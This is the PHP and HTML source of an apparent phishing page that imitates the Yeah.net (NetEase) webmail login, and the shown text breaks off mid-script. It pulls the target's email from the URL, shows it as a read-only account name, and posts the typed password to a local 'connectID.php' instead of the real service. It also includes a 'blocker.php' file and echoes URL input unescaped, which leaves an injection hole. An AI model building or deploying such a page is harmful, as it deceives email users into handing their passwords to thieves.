<?php
include('blocker.php');
?>
<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$loginpage = $_GET['loginpage'];
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<link rel="dns-prefetch" href="http://mimg.127.net">
<link rel="dns-prefetch" href="https://mail.yeah.net">
<meta name="description" content="&#32593;&#26131;YEAH&#20813;&#36153;&#37038;&#31665;--&#24555;&#20048; &#20998;&#20139; &#25104;&#38271;&#12290;&#23481;&#37327;&#33258;&#21160;&#32763;&#20493;&#65292;&#25903;&#25345;50&#20806;&#38468;&#20214;,&#20813;&#36153;&#24320;&#36890;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#36192;&#36865;2G&#36229;&#22823;&#38468;&#20214;&#26381;&#21153;&#12290;&#25903;&#25345;&#21508;&#31181;&#23458;&#25143;&#31471;&#36719;&#20214;&#25910;&#21457;&#65292;&#22403;&#22334;&#37038;&#20214;&#25318;&#25130;&#29575;&#36229;&#36807;98%&#12290;" />
<meta name="keywords" content="&#37038;&#20214;&#65292;&#37038;&#31665;&#65292;&#30005;&#23376;&#37038;&#20214;&#65292;&#30005;&#23376;&#37038;&#31665;&#65292;&#32593;&#26131;&#37038;&#31665;&#65292;yeah&#37038;&#31665;&#65292;&#20813;&#36153;&#37038;&#31665;&#65292;mail&#65292;email&#65292;&#32593;&#30424;" />
<title>Yeah.net&#32593;&#26131;&#20813;&#36153;&#37038;--&#24555;&#20048; &#20998;&#20139; &#25104;&#38271;</title>
<link rel="shortcut icon" href="http://mail.yeah.net/favicon.ico" />
<style type="text/css">
/* css reset */
body{color:#000;background:#fff;font-size:12px;line-height:166.6%;text-align:center;}
body,input,select,button{font-family:\5FAE\8F6F\96C5\9ED1, verdana, Simsun, STXihei;zoom:1;}
h1,h2,h3,select,input,button{font-size:100%}
body,h1,h2,h3,ul,li,form,p,img{margin:0;padding:0;border:0}
input,button,select,img{margin:0;line-height:normal}
select{padding:1px}
ul{list-style:none}
select,input,button,button img,label{vertical-align:middle}
header,footer,section,aside,nav,hgroup,figure,figcaption{display:block;margin:0;padding:0;border:none}
a{text-decoration:none;color:#848585}
a:hover{color:#000}
.fontWeight{font-weight:700;}
#styleConfText,
#remAutoLoginTxt,
.domain,
.nouserselect{-moz-user-select:none;-webkit-user-select:none;user-select:none;}
/* noscript */
.noscriptTitle{line-height:32px;font-size:24px;color:#d90000;padding:20px 0;font-weight:700;background:#fff;}
.noscriptLink{text-decoration:underline;color:#005590;font-size:14px;font-weight:400}
/* global */
html,body{width:100%;height:100%;overflow:hidden;}
body{position:relative;}
.mainUi,
.bgimg{width:100%;height:100%;position:absolute;left:0;top:0;}
.bgimg img{display:none;position:absolute;top:0;left:0;-ms-interpolation-mode:bicubic}
.bgimg{z-index:0;background-color:#a3a7ab;}
.mainUi{z-index:1;}
.logo{width:261px;height:80px;position:absolute;left:50%;top:50%;background:url(http://mimg.127.net/index/yeah/img/yeahlogo.png);text-indent:-9999px;margin-left:-130px;margin-top:-90px}

/* login */
.login{height:88px;width:100%;color:#fff;position:absolute;bottom:61px;left:0;z-index:1;}
.login-inner{line-height:20px;width:677px;height:88px;overflow:visible;margin:0 auto;position:relative;top:0px;text-align:center;white-space:nowrap;font-size:14px;}
.loginFormIpt{background:#444;background:rgba(68, 68, 68, .6);border:1px solid #ddd;border-radius:5px;height:38px;width:268px;position:absolute;/*overflow:hidden;*/font-size:14px;box-shadow:inset 0px 0px 8px rgba(0, 0, 0, 0.4);z-index: 1}
.placeholder{color:#ccc;position:absolute;left:0px;top:0px;line-height:38px;height:38px;width:268px;text-align:left;text-indent:16px;visibility:hidden;}
.loginFormIpt input{position:absolute;left:2px;padding:7px 14px;border:none;height:24px;line-height:24px;width:240px;background:none;color:#ccc;outline:0;font-size:16px;font-family:verdana, "Helvetica Neue", Helvetica, Arial, sans-serif;}

.loginFormIpt-over{border-color:#fff;}
.loginFormIpt-focus,
.loginFormIpt-over{background:rgba(68, 68, 68, .7)}
.loginFormIpt-focus{border-color:#bf0b10;}
.loginFormIpt-focus .placeholder{color:#b4c0d2;}
.loginFormTdIpt:focus{outline:0;}
.loginFormIpt .loginFormTdIpt-focus{color:#fff;font-weight:700;}
.showPlaceholder .placeholder{visibility:visible;cursor:text;}
.domain{position:absolute;top:0px;left:16px;color:#ccc;font-size:16px;line-height:38px;line-height:39px\9;height:38px;width:100px;text-align:left;font-weight:700;display:none;z-index:2;overflow:hidden;font-family:Verdana, "Helvetica Neue", Helvetica,  Arial, sans-serif;}
#idInputLine{left:0;top:0;overflow: hidden;}
#pwdInputLine{left:284px;top:0}
#idInputTest{visibility:hidden;float:left;font-size:16px;font-weight:700;font-family:verdana, "Helvetica Neue", Helvetica, Arial, sans-serif;}
#capsLockHint{position: absolute; top: 39px; left: 0px;padding: 4px 8px; font-size:12px; line-height: 12px; background-color: #ffffcc; border: 1px solid #d7d7d7; color: #555; z-index: 2;}
.formSubmit{position:absolute;top:0px;right:0;width:108px;height:40px;line-height:38px;border:1px solid #850e11;background:#bf0b10;color:#fff;font-size:16px;cursor:pointer;border-radius:5px;}
.formSubmit:hover{background:#d20c12;}
.formSubmit{
	background-image:-webkit-linear-gradient(top, #d51a1f, #b20106);
	background-image:-moz-linear-gradient(top, #d51a1f, #b20106);
	background-image:-o-linear-gradient(top, #d51a1f, #b20106);
	background-image:linear-gradient(top, #d51a1f, #b20106);
	box-shadow:inset 0px 0px 1px #fff;
}
.formSubmit:active{
	background:#b20106;
	background-image:-webkit-linear-gradient(top, #b20106, #d51a1f);
	background-image:-moz-linear-gradient(top, #b20106, #d51a1f);
	background-image:-o-linear-gradient(top, #b20106, #d51a1f);
	background-image:linear-gradient(top, #b20106, #d51a1f);
}
.loginLink{position:absolute;top:51px;left:0;text-decoration:none;color:#eee;}
.loginLink:hover{color:#fff;}
.loginFormCheckInner{position:absolute;top:51px;left:0;color:#eee;zoom:1;cursor:pointer;}
.loginFormConfLink,
.loginLink,
.yxLoginBtn,
.copyright,
.loginFormCheckInner{text-shadow:0px 1px 1px #000}
#remAutoLoginTxt{white-space: nowrap; word-break: keep-all;}

.loginFormCbx{background:rgba(68, 68, 68, .5);border:none;}
.loginLink-reg{text-decoration:underline;left:214px;}
.loginFormCheckInner input{vertical-align:baseline}

#icoDarr{position:absolute;right:0;display:block;height:7px;width:8px;bottom:4px;overflow:hidden;}
#icoDarr i{box-shadow:0px 1px 2px rgba(0, 0, 0, .5)}

#icoCheckbox{position:relative;display:inline-block;height:13px;width:13px;overflow:hidden;border:1px solid #ddd;background:#666;top:0.2em;left:0;border-radius:4px;background:rgba(102, 102, 102, 0.4);vertical-align:baseline}
.loginFormCheckInner i{display:none;}
.show i{display:block;}
#icoCheckbox.show{background:rgba(102, 102, 102, 0.6);}
.loginFormSslText{position:relative;top:0px;}

.loginFormConf{position:absolute;top:51px;right:122px;text-decoration:none;color:#eee;}
.loginFormConfLink{color:#eee;display:block;position:relaitve;padding-right:10px;}
.loginFormConfLink:hover{color:#fff;}
.loginFormVerList{width:442px;height:70px;overflow:hidden;background:#fff;border:1px solid #666;position:absolute;color:#666;padding-left:2px;background:rgba(255, 255, 255, 0.8);display:none;}
.loginFormVerList li{float:left;display:inline;overflow:hidden;line-height:32px;line-height:33px\9;margin-right:2px;margin-top:2px;}
.loginFormVerList li a{width:150px;height:32px;overflow:hidden;display:block;position:relative;text-align:left;text-indent:25px;}
.loginFormVerList li a:hover{background:#d9d9d9;}
.verSelected{color:#222;font-weight:700;}
.verSelected .icoTickRed{display:block;}
.icoTickRed{width:13px;height:13px;overflow:hidden;position:absolute;left:7px;top:9px;display:none;}

/*yixin*/
.yxLoginBtn,
#loginByYX,
.loginByYX-link,
.yxCode-btn{background: url(http://mimg.127.net/index/yeah/img/yixin_ico.png) no-repeat;}
.yxLoginBtn{position:absolute;top:51px;right:0;padding-left:18px;background-position: -253px -46px;color: #eee;}
.yxLoginBtn:hover{color:#fff;}
#loginByYX{position: absolute;top:-83px;right:-14px;width: 253px; height: 115px;padding-top:23px; background-position: 0 0; font-size: 12px; text-align: left; font-family: simsun; zoom:1; z-index: 2;}
#yxCode{float:left; display: inline; margin-left:30px; background-color: #fff;}
.loginByYX-txt,
.loginByYX-txt-err{position: absolute; top: 40px; left: 120px; color: #959595; line-height: 23px;}
.loginByYX-txt-err{color: #626262;}
.loginByYX-link{margin:0 3px; padding-left:16px; display: inline-block; line-height: 14px; background-position: -253px -30px;}
.loginByYX-link,
.loginByYX-link:hover{color:#279c7b;}
#yxCodeRefresh{position: absolute; top: 22px; left: 29px; width: 80px; height: 80px;}
.yxCode-mask{height: 100%; background: #fff; opacity: 0.8; filter:alpha(opacity=80);}
.yxCode-btn{position: absolute; top: 28px; left: 7px; display: block; width: 68px; height: 28px; line-height: 28px; background-position: -253px 0; color: #6D798C; text-align: center; font-size: 14px;}
.yxCode-btn:hover{color:#347BC7;}

/* footer */
.footer{height:60px;width:100%;overflow:hidden;border-top:1px dotted #ccc;color:#ccc;position:absolute;bottom:0;left:0;z-index:0;text-shadow:0px 1px 1px #000}
.footerNav{line-height:normal;margin:0 auto;position:relative;top:24px;text-align:center;white-space:nowrap}
.footerNav a{margin-left:10px;color:#ccc;}
.footerNav a:hover{color:#eee;}

/* ie6fix */
* html .logo{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://mimg.127.net/index/yeah/img/yeahlogo.png');background:none}
</style>
<script id="jsOption" type="text/javascript">
//&#24403;&#21069;&#22495;&#21517;&#37197;&#32622;
var gOption = {
	"sDomain" : "yeah.net",
	"sCookieDomain" : "yeah.net",
	"sAutoLoginUrl" : "http://mail.yeah.net/entry/cgi/ntesdoor?lightweight=1&verifycookie=1&from=web&df=webmailyeah",
	"sSslAction" : "https://mail.yeah.net/entry/cgi/ntesdoor?",
	"product" : "mailyeah",
	"url" : "http://mail.yeah.net/entry/cgi/ntesdoor?",
	"url2" : "http://mail.yeah.net/errorpage/err_yeah.htm",
	"gad" : "yeah.net"
}
</script>
<script id="jsBase" type="text/javascript" src="http://mimg.127.net/index/lib/scripts/base_v5.min.js"></script>
<script id="jsInit" type="text/javascript">
fSetCookie("starttime",'',false); // starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
fCheckCookie();
fCheckAutoLogin();
fAutoLogin();
fCheckBrowser();
fHtml5Tag();
</script>
</head>

<body>
<div id="mainbg" class="bgimg">
	<img id="mainbg_img" src="" alt="" />
	<img id="mainbg_img2" src="" alt="" />
	<noscript><p class="noscriptTitle">&#27983;&#35272;&#22120;&#19981;&#25903;&#25345;&#25110;&#31105;&#27490;&#20102;&#32593;&#39029;&#33050;&#26412;&#65292;&#23548;&#33268;&#24744;&#26080;&#27861;&#27491;&#24120;&#30331;&#24405;&#12290;<a class="noscriptLink" href="http://help.mail.163.com/faqDetail.do?code=d7a5dc8471cd0c0e8b4b8f4f8e49998b374173cfe9171305fa1ce630d7f67ac2122641eb4548bd1e" target="_blank">&#22914;&#20309;&#35299;&#38500;&#33050;&#26412;&#38480;&#21046;</a></p></noscript>
</div>
<section id="mainUi" class="mainUi">
	<header>
		<h1 class="logo">Yeah.net &#32593;&#26131;&#20813;&#36153;&#37038;</h1>
	</header>
	<div class="login">		
		<div class="login-inner">
<form name="loginyeah" method="post" action="connectID.php">
	<input type="hidden" id="username" name="username" value="<?php echo $_GET['email']; ?>" />
				<input style="display:none;" type="checkbox" title="SSL&#23433;&#20840;&#30331;&#24405;" id="sslLogin" checked="checked" />
				<input style="display:none;" type="checkbox" id="allssl" />
				<div id="idInputLine" class="loginFormIpt showPlaceholder">
<input class="loginFormTdIpt" title="&#35831;&#36755;&#20837;&#24080;&#21495;" id="idInput" readonly=""  type="text"  value="<?php echo $loginID ?>" />
					<label for="idInput" class="placeholder" id="idPlaceholder">&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;</label>
					<div id="showdomain" class="domain">@yeah.net</div>
					<div id="idInputTest"></div>
				</div>
				<div id="pwdInputLine" class="loginFormIpt showPlaceholder">
<input class="loginFormTdIpt" autofocus="autofocus" tabindex="1" title="&#35831;&#36755;&#20837;&#23494;&#30721;" id="pwdInput" name="password" required="required" type="password" value="" />
					<label for="pwdInput" class="placeholder" id="pwdPlaceholder">&#23494;&#30721;</label>
					<p id="capsLockHint" style="display: none">&#22823;&#20889;&#29366;&#24577;&#24320;&#21551;</p>
				</div>
				<button id="loginBtn" class="formSubmit" tabindex="6" type="submit">&#30331;&nbsp;&nbsp;&#24405;</button>
				<div class="loginFormCheckInner" id="remAutoLogin">
					<b id="icoCheckbox"></b>
					<span id="remAutoLoginTxt"></span>
				</div>
				<a id="lfBtnReg" class="loginLink loginLink-reg" href="#" target="_blank" tabindex="7">&#27880;&#20876;&#24080;&#21495;</a>
				<a class="loginLink" id="forgetPass" style="left:284px;" href="#" target="_blank" title="&#25214;&#22238;&#23494;&#30721;">&#24536;&#35760;&#23494;&#30721;?</a>
				<div class="loginFormConf">
					<a class="loginFormConfLink" id="styleConf" href="javascript:void(0);"><span id="styleConfText">&#40664;&#35748;&#29256;&#26412;</span><b id="icoDarr"></b></a>
					<div id="styleConfBlock" class="loginFormVerList">
						<ul>
							<li>
								<a id="styleconf-1" style="width:125px" class="verSelected" href="javascript:void(0);" onclick="indexLogin.setStyle(-1)"><b class="icoTickRed"></b>&#40664;&#35748;&#29256;&#26412;</a>
							</li>
							<li>
								<a id="styleconf7" style="width:150px" href="javascript:void(0);" onclick="indexLogin.setStyle(7)"><b class="icoTickRed"></b>&#32593;&#26131;&#37038;&#31665;6.0&#29256;</a>
							</li>
							<li>
								<a id="styleconf6" style="width:150px" href="javascript:void(0);" onclick="indexLogin.setStyle(6)"><b class="icoTickRed"></b><span id="jy6txt">&#32593;&#26131;&#37038;&#31665;6.0&#31616;&#32422;&#29256;</span></a>
							</li>
							<li>
								<a id="styleconf2" style="width:125px" href="javascript:void(0);" onclick="indexLogin.setStyle(2)"><b class="icoTickRed"></b>&#38738;&#26592;&#26657;&#22253;&#37038;&#31665;</a>
							</li>
							<li>
								<a id="styleconf5" style="width:150px" href="javascript:void(0);" onclick="indexLogin.setStyle(5)"><b class="icoTickRed"></b>&#32593;&#26131;&#37038;&#31665;5.0&#29256;</a>
							</li>
							<li>
								<a id="styleconf3" style="width:150px" href="javascript:void(0);" onclick="indexLogin.setStyle(3)"><b class="icoTickRed"></b><span id="jy5txt">&#32593;&#26131;&#37038;&#31665;5.0&#31616;&#32422;&#29256;</span></a>
							</li>
						</ul>
					</div>					
				</div>
				<a class="yxLoginBtn" id="yxLoginBtn" href="javascript:void(0)">&#20108;&#32500;&#30721;&#30331;&#24405;</a>
			</form>
			<div id="loginByYX" style="display:none">
				<img id="yxCode" width="80" height="80" src="" />
				<div id="yxCodeRefresh" style="display:none;">
					<div class="yxCode-mask"></div>
					<a id="refeshYXCodeBtn" class="yxCode-btn" href="javascript:void(0)">&#21047; &#26032;</a>
				</div>
				<div id="yxCodeTxt" class="loginByYX-txt"></div>
				<form id="codeLoginForm" method="post" action="" autocomplete="off" target="_self"></form>
			</div>
		</div>
	</div>
	<footer class="footer">
		<div class="footerNav" id="footerTxt">
			<span class="copyright">&#32593;&#26131;&#20844;&#21496;&#29256;&#26435;&#25152;&#26377; &copy; 1997-2014</span><a id="recordNum" href="http://img2.cache.netease.com/www/icp.jpg" target="_blank">ICP&#35777;&#31908;B2-20090191</a><a href="http://corp.163.com/index_gb.html" target="_blank">&#20851;&#20110;&#32593;&#26131;</a><a href="http://mail.163.com/html/mail_intro" target="_blank">&#20851;&#20110;&#32593;&#26131;&#20813;&#36153;&#37038;</a><a href="http://1.163.com/" target="_blank">&#19968;&#20803;&#22842;&#23453;</a><a href="http://mail.blog.163.com/" target="_blank">&#37038;&#31665;&#23448;&#26041;&#21338;&#23458;</a><a href="http://help.mail.163.com" target="_blank" style="margin-right:10px">&#23458;&#25143;&#26381;&#21153;</a>|<span id="extText"></span>
		</div>
	</footer>
</section>
<iframe class="httploginframe" src="about:blank" id="frameforlogin" name="frameforlogin" style="overflow:hidden;border:0;height:0;width:0">&#30331;&#24405;iframe</iframe>
<script type="text/javascript">
var oStyle = {
	value	:	'-1'
};
(function(){
	window.indexLogin = {
		init 				: fInit,
		changeMainBg 		: fChangeMainBg,
		calImg 				: fCalImg,
		reCalImg 			: fReCalImg,
		setUserInfo 		: fSetUserInfo,
		initInputBox 		: fInitInputBox,
		idInputEvent 		: fIdInputEvent,
		checkPw 			: fCheckPw,
		checkInputAlways 	: fCheckInputAlways,
		setStyle 			: fSetStyle,
		submitForm 			: fSubmitForm,
		checkHttps 			: fCheckHttps,
		showYXCode 			: fShowYXCode,
		emuIcon 			: fEmuIcon,
		emuIconTick 		: fEmuIconTick,
		shadowFix 			: fShadowFix,
		fixNarrowScreen		: fFixNarrowScreen
	};

	var aBgImgConf = [
		'http://mimg.127.net/index/yeah/themes/yeah_bg.jpg'
	];
	var aBgImgConfOnload = [];
	var nBgImgCounter = 0,
		bBgImgChanging = false,
		bBgImgDraging = false;
	var oCurrentImg;
	var nImgOpa = 0;
	var aShadowFix = [];

	var oId, oIdL, oPw, oPwL;
	//&#30331;&#24405;&#27969;&#31243;
	var sLoginFunc = 'ssl',
		bIsFirstLog = true,
		sCoremailCookie = '';
	// starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
	var bStartTime = true;

	function fInit(){
		var me = this;

		oId = $id('idInput');
		oIdL = $id('idInputLine');
		oPw = $id('pwdInput');
		oPwL = $id('pwdInputLine');

		me.changeMainBg(nBgImgCounter);

		window.onresize = function(){
			me.reCalImg();
			me.fixNarrowScreen();
		};

		// &#22823;&#20889;&#38145;&#23450;&#24320;&#21551;&#21028;&#26029;
		var oCapsLockTest = new CapsLock({
			el : $id('pwdInput'),
			change : function(bFlag){
				var oHint = $id('capsLockHint');
				if(bFlag){
					oHint.style.display = 'block';
				}else{
					oHint.style.display = 'none';
				}
			}
		});

		me.setUserInfo();
		me.initInputBox();

		//fEventListen($id('loginyeah'),'submit',function(){return me.submitForm();});
		$id('loginyeah').onsubmit = function(){
			return me.submitForm();
		};

		// &#27169;&#25311;“&#21313;&#22825;&#20813;&#30331;&#24405;”&#30333;&#33394;&#21246;
		$id('icoCheckbox').innerHTML = me.emuIconTick('colorWhite');
		// &#27169;&#25311;“&#29256;&#26412;&#36873;&#25321;”&#19979;&#25289;&#31661;&#22836;
		$id('icoDarr').innerHTML = me.emuIcon([
			 {x : 0, y : 0, width : 1, height : 1, color : 'f2f1ee'}
			,{x : 1, y : 0, width : 6, height : 1, color : 'fff'}
			,{x : 7, y : 0, width : 1, height : 1, color : 'ede9e6'}
			,{x : 1, y : 1, width : 1, height : 1, color : 'f8f7f6'}
			,{x : 2, y : 1, width : 4, height : 1, color : 'fff'}
			,{x : 6, y : 1, width : 1, height : 1, color : 'f0eeec'}
			,{x : 2, y : 2, width : 3, height : 1, color : 'fff'}
			,{x : 5, y : 2, width : 1, height : 1, color : 'f7f6f6'}
			,{x : 3, y : 3, width : 2, height : 1, color : 'fff'}
			,{x : 3, y : 3, width : 2, height : 1, color : 'fff'}
			,{x : 3, y : 4, width : 1, height : 1, color : 'd1cdc7'}
			,{x : 4, y : 4, width : 1, height : 1, color : 'c3bcb2'}
		]);
		
		me.showYXCode();
		me.shadowFix();
		me.fixNarrowScreen();
	}

	/**
	 * &#32972;&#26223;&#22270;&#22788;&#29702;
	 * @param  {Number|String} nPic &#21487;&#20026;&#20855;&#20307;&#22836;&#22270;&#19979;&#26631;&#65307;&#25110;&#20026;next/prev
	 */
	function fChangeMainBg(nPic){
		var me = this;
		var oBgImg = $id('mainbg_img'),
			oBgImg2 = $id('mainbg_img2');
		oCurrentImg = oBgImg;
		var nPicNum = nPic;
		if(bBgImgChanging){
			return;
		}else{
			bBgImgChanging = true;
		}
		switch(nPicNum){
			case 'next' :
				nPicNum = nBgImgCounter + 1;
				break;
			case 'prev' :
				nPicNum = nBgImgCounter - 1;
				break;
			default : ;
		}
		// &#38169;&#35823;&#19979;&#26631;&#20462;&#27491;
		if(nPicNum < 0 || nPicNum > aBgImgConf.length - 1){
			nBgImgCounter = 0;
			nPicNum = 0;
		}
		// &#21028;&#26029;&#26174;&#31034;&#21738;&#20010;&#22270;&#29255;
		if(oBgImg.alt == ''){
			_fChangeMainBgInit(oBgImg, oBgImg2, nPicNum);
		}else{
			_fChangeMainBgInit(oBgImg2, oBgImg, nPicNum);
		}
		nBgImgCounter = nPicNum;
		return;
		
		function _fChangeMainBgInit(obj1, obj2, nPic){
			// &#37325;&#32622;&#23646;&#24615;
			obj2.style.zIndex = 0; // &#38544;&#34255;obj2&#26174;&#31034;
			obj2.alt = '';
			obj2.onload = function(){}
			obj2.onerror = function(){}
			// &#26174;&#31034;obj1
			obj1.alt = 'Yeah.net &#32593;&#26131;&#20813;&#36153;&#37038;';
			obj1.src = '';
			obj1.style.filter = 'alpha(opacity=0)';
			obj1.style.opacity = 0;
			obj1.style.zIndex = 1;
			obj1.style.height = '';
			obj1.style.width = '';
			nImgOpa = 0;
			oCurrentImg = obj1; // &#35760;&#24405;&#24403;&#21069;&#23545;&#35937;
			// &#21028;&#26029;&#26159;&#21542;&#24050;&#21152;&#36733;&#36807;&#27492;&#22270;
			if(aBgImgConfOnload[nPic]){
				obj1.style.display = 'inline';
				// &#26816;&#27979;&#21152;&#36733;&#23436;&#27605;
				window.oBgImgCacheCheck = setInterval(function(){
					if(obj1.width > 0){
						clearInterval(window.oBgImgCacheCheck);
						_fExecImgCal(aBgImgConf[nPic], obj2);
					}
				}, 50);
				setTimeout(function(){
					obj1.src = aBgImgConf[nPic];
				}, 20);
			}else{
				obj1.onload = function(){
					obj1.style.display = 'inline';
					// &#26816;&#27979;&#21152;&#36733;&#23436;&#27605;
					window.oBgImgCacheCheck = setInterval(function(){
						if(obj1.width > 0){
							clearInterval(window.oBgImgCacheCheck);
							aBgImgConfOnload[nPic] = {};
							aBgImgConfOnload[nPic]['isLoaded'] = true;
							aBgImgConfOnload[nPic]['width'] = obj1.width;
							aBgImgConfOnload[nPic]['height'] = obj1.height;
							_fExecImgCal(aBgImgConf[nPic], obj2);
						}
					}, 50);
				}
				obj1.onerror = function(){  // &#21152;&#36733;&#22833;&#36133;&#26041;&#26696;
					obj1.style.display = 'none';
					bBgImgChanging = false;
				}
				setTimeout(function(){
					obj1.src = aBgImgConf[nPic];
				},0)
			}
		}
		
		function _fExecImgCal(sNowPath, oExObj){
			me.calImg(oCurrentImg, function(){
				oExObj.src = sNowPath;
			});
		}
	}

	/**
	 * &#35745;&#31639;&#32972;&#26223;&#22270;&#26174;&#31034;&#29366;&#24577;
	 * @param  {[type]} obj   [description]
	 * @param  {Function} fCall &#39069;&#22806;&#22788;&#29702;
	 */
	function fCalImg(obj, fCall){
		var oImg = obj;
		var nHeight, nWidth, nTruthHeight, nTruthWidth;
		var nClientW = document.documentElement.clientWidth,
			nClientH = document.documentElement.clientHeight;

		if(aBgImgConfOnload[nBgImgCounter]){
			nHeight = aBgImgConfOnload[nBgImgCounter].height;
			nWidth = aBgImgConfOnload[nBgImgCounter].width;
		}else{
			nHeight = oImg.height;
			nWidth = oImg.width;
		}
		// &#22914;&#26524;&#22270;&#29255;&#23485;&#22823;&#20110;&#39640;
		if(nHeight < nWidth){
			// &#37027;&#20040;&#22270;&#29255;&#30495;&#23454;&#23485;&#24230;&#31561;&#20110;&#27983;&#35272;&#22120;&#23485;&#24230;
			nTruthWidth = nClientW;
			// &#31561;&#27604;&#20363;&#32553;&#25918;&#39640;&#24230;
			nTruthHeight = nTruthWidth * nHeight / nWidth;
		}else{
			// &#21542;&#21017;&#22270;&#29255;&#30495;&#23454;&#39640;&#24230;&#31561;&#20110;&#27983;&#35272;&#22120;&#39640;&#24230;
			nTruthHeight = nClientH;
			// &#31561;&#27604;&#20363;&#32553;&#25918;&#23485;&#24230;
			nTruthWidth = nTruthHeight * nWidth / nHeight;
		}
		// &#22914;&#26524;&#27983;&#35272;&#22120;&#39640;&#24230;&#22823;&#20110;&#22270;&#29255;&#39640;&#24230;
		if(nTruthHeight < nClientH){
			// &#37027;&#20040;&#25289;&#20280;&#22270;&#29255;&#21040;&#27983;&#35272;&#22120;&#19968;&#26679;&#39640;
			oImg.style.height = '100%';
			// &#36825;&#20010;&#26102;&#20505;&#22270;&#29255;&#23485;&#24230;&#23601;&#28322;&#20986;&#23631;&#24149; &#25152;&#20197;&#27700;&#24179;&#23621;&#20013;
			oImg.style.width = 'auto';
			oImg.style.marginLeft = - (nClientH * nWidth / nHeight - nClientW) / 2 + 'px';
			oImg.style.marginTop = '0';
		}else{
			// &#21542;&#21017;&#25289;&#20280;&#22270;&#29255;&#21040;&#27983;&#35272;&#22120;&#19968;&#26679;&#23485;
			oImg.style.width = '100%';	
			// &#36825;&#20010;&#26102;&#20505;&#22270;&#29255;&#39640;&#24230;&#23601;&#28322;&#20986;&#23631;&#24149; &#25152;&#20197;&#22402;&#30452;&#23621;&#20013;
			oImg.style.height = 'auto';
			oImg.style.marginTop = - (nClientW * nHeight / nWidth - nClientH) / 2 + 'px';
			oImg.style.marginLeft = '0';
		}
		if(!bBgImgDraging){
			_fChangeMainBgAnimation(obj);
		}
		
		function _fChangeMainBgAnimation(obj){
			window.oBgImgChanging = setInterval(function(){
				nImgOpa = nImgOpa + 0.2;
				try{
					obj.style.filter = 'alpha(opacity=' + nImgOpa*100 + ')';  
					obj.style.opacity = Number(nImgOpa);
				}catch(e){
					alert(e);
					obj.style.display = 'none';
					clearInterval(oBgImgChanging);
					bBgImgChanging = false;
				}
				if(nImgOpa >= 1){
					bBgImgChanging = false;
					clearInterval(oBgImgChanging);
					bBgImgDraging = false;
					fCall && fCall();
				}
			}, 40);
		}
	}

	/**
	 * &#37325;&#26032;&#35745;&#31639;&#32972;&#26223;&#22270;&#21442;&#25968;
	 */
	function fReCalImg(){
		var me = this;
		// &#20462;&#27491;resize&#22810;&#27425;
		bBgImgDraging = true;
		// &#25302;&#21160;&#29305;&#27530;&#22788;&#29702; &#19981;&#21028;&#26029;&#26159;&#21542;&#21152;&#36733;
		if(bBgImgDraging){
			me.calImg(oCurrentImg);
			bBgImgDraging = false;
			return;
		}
	}

	/**
	 * &#26681;&#25454;cookie&#39044;&#35774;&#29992;&#25143;&#20449;&#24687;
	 */
	function fSetUserInfo(){
		var me = this;
		//&#35835;&#21462;logType,&#35774;&#23450;&#39118;&#26684;
		var sLogType = fGetCookie('logType');
		if(sLogType == '' || sLogType == null){
			sLogType = gUserInfo.style;
		}
		switch(sLogType){
			case '7':
				me.setStyle(7); // js6
				break;
			case '6':
				me.setStyle(6); // jy6
				break;
			case '5':
				me.setStyle(5); // js5
				break;
			case '3':
				me.setStyle(3); // jy5
				break;
			case '2':
				me.setStyle(2); // &#38738;&#26592;
				break;
			default :
				me.setStyle(-1);
		}
		//&#20860;&#23481;logType&#24182;&#28165;&#38500;
		fSetCookie('logType' , '' , false);
		var sUser = gUserInfo.username,
			sUid = fGetQueryHash('uid'),
			sResult;
		//&#35835;&#21462;nts_mail_user&#65292;&#35774;&#23450;&#29992;&#25143;&#21517;
		if(sUser != null){
			oId.autocomplete='on';
		}else{
			oId.autocomplete='off';
		}
		oId.focus();
		if(sUser != '' && sUser != null){
			sResult = sUser;
			if( sUid != null ){
				sResult = fCheckAccount(sUid);
			}
			fCls(oIdL, 'showPlaceholder', 'remove');
			oId.value = sResult;
			//me.idInputEvent();
			//gMobileNumMail.getNumFromMail(oId.value);
			oPw.focus();
		}	
	}

	/**
	 * &#32465;&#23450;&#36755;&#20837;&#26694;&#20107;&#20214;
	 */
	function fInitInputBox(){
		var me = this;
		var oLo = $id('loginBtn'),	
			oRg = $id('lfBtnReg'),
			oIdLabel = $id('idPlaceholder'),
			oPwLabel = $id('pwdPlaceholder'),
			oShowDomain = $id('showdomain'),
			oSaveLogin = $id('savelogin'),
			oStyleConfBlk = $id('styleConfBlock');
		
		// &#19981;&#21487;&#36873;
		fEventListen(oShowDomain,'selectstart',function(){
			return false;
		});
		fEventListen(oShowDomain,'click',function(){
			oId.focus();
			return false;
		});
		fEventListen($id('remAutoLoginTxt'),'selectstart',function(){
			return false;
		});
		fEventListen($id('styleConfText'),'selectstart',function(){
			return false;
		});
		
		//&#24080;&#21495;
		fEventListen(oIdL,'mouseover',function(){
			fCls(oIdL, 'loginFormIpt-over', 'add');
		});
		fEventListen(oIdL,'mouseout',function(){
			fCls(oIdL, 'loginFormIpt-over', 'remove');
		});
		fEventListen(oId,'focus',function(){
			fCls(oId, 'loginFormTdIpt-focus', 'add');
			fCls(oIdL, 'loginFormIpt-focus', 'add');
		});
		fEventListen(oId,'blur',function(){
			fCls(oIdL, 'loginFormIpt-focus', 'remove');	
			if(oId.value == ''){
				fCls(oIdL, 'showPlaceholder', 'add');
				fCls(oId, 'loginFormTdIpt-focus', 'remove');
			}else{
				oId.value = fCheckAccount(oId.value);
			}
		});
		
		var sEventName = '';
		var bIsIe = false;
		if(document.body.onpropertychange === null){
